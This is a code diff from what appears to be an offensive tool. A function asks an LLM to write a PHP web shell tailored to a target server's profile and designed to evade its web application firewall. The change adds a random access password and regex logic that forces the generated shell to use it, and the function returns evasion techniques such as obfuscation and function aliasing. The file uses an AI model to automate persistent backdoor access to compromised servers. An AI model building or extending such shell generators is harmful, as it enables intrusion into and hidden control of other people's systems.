@@ -699,9 +699,13 @@ Provide post-deploy analysis as JSON: { "summary": "...", "lessonsLearned": ["..
 
 export async function aiGenerateCustomShell(profile: TargetProfile): Promise<{
   shellCode: string;
+  shellPassword: string;
   explanation: string;
   evasionTechniques: string[];
 } | null> {
+  // Generate a cryptographically random password for this shell instance
+  const shellPassword = randomHex(16);
+
   try {
     const response = await invokeLLM({
       messages: [
@@ -726,7 +730,7 @@ WAF: ${profile.wafDetected || "None"}
 OS: ${profile.osGuess || "Linux"}
 
 The shell should evade ${profile.wafDetected || "basic"} detection.
-Use password: PLACEHOLDER_PWD (will be replaced)`,
+Use password: ${shellPassword}`,
         },
       ],
     });
@@ -735,10 +739,29 @@ Use password: PLACEHOLDER_PWD (will be replaced)`,
     if (content && typeof content === "string") {
       // Extract PHP code
       const phpMatch = content.match(/<\?php[\s\S]*?\?>/);
-      const shellCode = phpMatch ? phpMatch[0] : content;
+      let shellCode = phpMatch ? phpMatch[0] : content;
+
+      // Safety check: ensure the generated shell actually contains our password
+      // If the LLM used a different password, replace it
+      if (!shellCode.includes(shellPassword)) {
+        // Try to find and replace common password patterns in the generated code
+        const commonPatterns = [
+          /\$(?:pass|pwd|key|password|auth)\s*=\s*['"]([^'"]+)['"]/i,
+          /md5\(['"]([^'"]+)['"]\)/i,
+          /sha1\(['"]([^'"]+)['"]\)/i,
+        ];
+        for (const pattern of commonPatterns) {
+          const match = shellCode.match(pattern);
+          if (match && match[1]) {
+            shellCode = shellCode.replace(match[1], shellPassword);
+            break;
+          }
+        }
+      }
       
       return {
         shellCode,
+        shellPassword,
         explanation: `Custom shell generated for ${profile.serverType || "unknown"} server${profile.wafDetected ? ` with ${profile.wafDetected} evasion` : ""}`,
         evasionTechniques: profile.wafDetected 
           ? [`${profile.wafDetected} bypass`, "variable obfuscation", "function aliasing"]
